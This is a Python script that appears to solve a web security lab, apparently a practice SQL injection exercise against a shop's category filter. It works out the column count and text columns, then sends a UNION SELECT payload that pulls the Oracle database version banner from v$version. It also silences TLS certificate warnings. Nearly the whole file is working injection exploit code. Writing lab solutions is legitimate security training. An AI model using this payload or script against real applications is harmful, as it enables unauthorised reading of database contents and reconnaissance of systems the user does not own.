import sys
import logging
import urllib3
import requests
import re
import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main(args):
    shop = Shop(args.url, args.no_proxy)
    num_columns = utils.determine_number_of_columns(
        shop.category_url, shop.no_proxy, oracle=True
        )
    if not num_columns:
        log.error("Couldn't determine number of columns. Exiting")
        sys.exit(-1)
    text_columns = utils.determine_text_columns(
        shop.category_url, shop.no_proxy, num_columns, oracle=True
    )
    nulls = ["NULL"] * num_columns
    nulls[text_columns[0]] = "banner"
    nulls_str = ",".join(nulls)
    exploit = f"' UNION SELECT {nulls_str} FROM v$version--"
    shop.get_category(exploit)
    shop.is_solved()
    
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)
